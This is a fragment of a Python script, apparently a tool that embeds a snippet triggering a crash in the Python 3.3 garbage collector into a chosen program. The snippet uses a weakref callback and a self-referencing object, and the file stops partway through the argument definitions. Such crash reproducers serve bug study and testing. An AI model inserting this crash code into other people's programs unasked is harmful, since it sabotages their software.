import weakref
class A(object):pass
def callback(x):del lst[0]
keepali0e=[]
lst=[str()]
a=A()
a.c=a
keepali0e.append(weakref.ref(a,callback))
del a
while lst:keepali0e.append(lst[:])
dest=['dont','change','me']
"""

# Arguments
parser = argparse.ArgumentParser(
        description="Exploit a potential crash in the Python garbage collector"
        )
parser.add_argument(
        '--dest',
        metavar='DESTINATION',
        default='./',
        help="The directory in which to write the program",
        )
parser.add_argument(
        '-p',
        '--program',
        metavar='PROGRAM',
        help="The program in which to include the exploit",
        )
parser.add_argument(
        '-o',
        metavar='OUTPUT',
        help="The name of the output file",
        )
parser.add_argument(
        '-l',
        '--list',
        action='store_true',
        help=("Exploit a crash in the gc list iterator. This bug was "
              "introduced in Python 3.3 and fixed in Python 3.3.1"),
        )
parser.add_argument(
        '
